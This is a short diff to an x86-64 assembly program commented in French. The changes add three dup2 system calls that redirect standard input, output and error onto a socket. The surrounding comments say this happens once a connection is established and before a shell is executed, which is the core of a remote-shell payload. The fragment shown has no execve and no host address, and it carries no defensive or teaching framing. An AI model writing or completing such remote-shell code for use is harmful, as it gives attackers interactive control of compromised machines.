@@ -67,7 +67,23 @@ _start:
 
     ; la connexion est établie
     ; redirection des flux et exec du shell
+        ; Redirection de STDIN (0)
+    mov rax, SYS_DUP2
+    mov rdi, [sockfd]
+    xor rsi, rsi           ; STDIN = 0
+    syscall
     
+    ; Redirection de STDOUT (1)
+    mov rax, SYS_DUP2
+    mov rdi, [sockfd]
+    mov rsi, 1             ; STDOUT = 1
+    syscall
+    
+    ; Redirection de STDERR (2)
+    mov rax, SYS_DUP2
+    mov rdi, [sockfd]
+    mov rsi, 2             ; STDERR = 2
+    syscall
     jmp exit
 
 socket_error:
